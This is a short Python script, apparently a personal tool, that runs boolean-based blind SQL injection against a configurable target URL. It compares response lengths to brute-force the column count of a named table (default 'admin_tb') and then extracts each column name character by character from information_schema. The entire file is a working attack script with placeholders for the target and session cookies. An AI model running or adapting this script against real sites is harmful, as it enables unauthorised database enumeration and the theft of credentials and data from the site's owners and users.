# -*- coding: utf-8 -*-
"""
Created on Wed Oct 28 20:03:11 2020

@author: WinterMute1000
"""

import requests
DEFAULT_URL="http://127.0.0.1" #Please input your target URL
COOKIES={'cookies':'cookies'} #Input Cookie
TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+",cookies=COOKIES).text)
#TRUE_RES==different html length
KNOWN_TABLE_NAME="admin_tb" #Please input your target table

def get_columns_num():
    for i in range(1,21):
        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27+and+%28select+count%28column_name%29+from+information_schema.columns+where+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27%29+%3D"+str(i)+"+--+",cookies=COOKIES).text):
            print("Columns num:"+str(i))
            return i;
    
    print("Columns num over 20")
    return 20;

def get_columns_name(columns_num):
    columns_name_list=['']*columns_num
    for idx in range(0,columns_num):
        for column_name_length in range(1,31): # get columns name length
            if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+%28select+length%28column_name%29+from+information_schema.columns+WHERE+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27+order+by+1+limit+"+str(idx)+"%2C1%29%3D"+str(column_name_length)+"+--+",cookies=COOKIES).text):
                for column_name_idx in range(0,column_name_length+1):
                    for ascii_code in range(32,127): #get one character columns name
                        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+column_name+from+information_schema.columns+WHERE+table_name%3D%27"""+KNOWN_TABLE_NAME+"%27+order+by+1+limit+"+str(idx)+"%2C"+str(1)+"%29%2C"+str(column_name_idx)+"%2C1%29%29%3D"+str(ascii_code)+"+--+",cookies=COOKIES).text):
                            columns_name_list[idx]=columns_name_list[idx]+chr(ascii_code)
                break
            
    print(columns_name_list)
    return columns_name_list
        

if __name__=="__main__":
    columns_num=get_columns_num()
    get_columns_name(columns_num)
